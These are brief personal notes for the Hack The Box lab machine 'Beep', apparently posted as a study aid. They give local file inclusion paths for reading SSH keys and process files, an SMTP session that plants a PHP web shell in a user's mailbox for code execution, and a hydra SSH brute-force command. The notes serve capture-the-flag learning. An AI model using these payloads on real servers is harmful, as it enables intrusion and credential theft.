# Beep Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

# ${{\color{purple}Initial Foothold}}\ $

* First point when he have a security TLS error in firefox like this 
 ![image](https://user-images.githubusercontent.com/123066149/217526766-f4604150-68a0-465c-8ade-30c2f22b9e17.png)

You have to go to the firefox settings and accept the depreciated protocols -> new tab -> about:config -> security.version.enable-deprecated (true)

# ${{\color{purple}Exploitation}}\ $

LFI tips: 
- /var/lib/<username>/.ssh/id_rsa%00
- /proc/self/status%00 (look at the uid of the user and look at the user who runs the application in `/etc/passwd`)
- check /proc/self/about%00 (check the possible user agent `<?php echo "hello"; ?>`)
- use the burp suite intruder to see if there are any other accessible files
  
# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/217532253-26283ba3-dd22-439b-bfbc-8ddf4a65e467.png)
  
`telnet 10.10.10.7 25` 
  
  ### or
  
`nc -nvv 10.10.10.7 25`
  
``EHLO test.beep.htb``
  
``VRFY asterisk@localhost``
  
``mail from:pwned@haha.io``
  
``rcpt to:asterisk@localhost``
  
``data``
  
``Subject: You got owned``
  
``<?php echo system($REQUEST['id']); ?>``
  
``blanck line``
  
``.``
  
![beep2](https://user-images.githubusercontent.com/123066149/217533503-0b8ad502-2a6b-4d82-ba0b-65842e428c39.PNG)

 use burp to try a code execution : `/var/mail/user%00`
  
# ${{\color{purple}Points of Improvement}}\ $

* Improve my directory brute force
* Use `curl -k (https://) -o xxx.png` use -k for allow insecure server connections
* Use `exiftool` for .png
* Use `ctrl + U` to improve a display
* Use vi `:g/nologin/d` to clean up the outputw of the `/etc/passwd` file
* When i found a `password` and `user` don't hesitate to directly do a bruteforce

`ssh hydra -L users -P pw ssh://IP`
* Use the smart decode function of burp
